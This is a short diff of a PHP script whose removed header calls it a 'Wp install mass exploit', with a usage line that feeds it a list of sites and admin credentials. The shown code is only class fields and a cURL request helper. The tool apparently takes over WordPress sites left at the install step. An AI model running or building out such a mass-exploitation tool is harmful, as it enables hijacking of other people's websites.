@@ -1,8 +1,4 @@
 <?php
-/// RINTOD
-/// Usage: php file.php list=listsite.txt user=user pass=password email=email@cm.com
-/// if u want to save file just add ding save=file.txt
-/// Wp install mass exploit
 namespace Rinto{
 	class wpInstl{
 		public $url, $user, $pass, $email, $save, $ch, $cookie_jar, $payload, $lists;
@@ -68,7 +64,7 @@ namespace Rinto{
 			$str = explode($start, $string);
 			$str = explode($end, $str[1]);
 			return $str[0];
-    }
+		}
 		function reQuest($url, $fol = null){
 			curl_setopt($this->ch, CURLOPT_URL, $url);
 			curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT, 120);
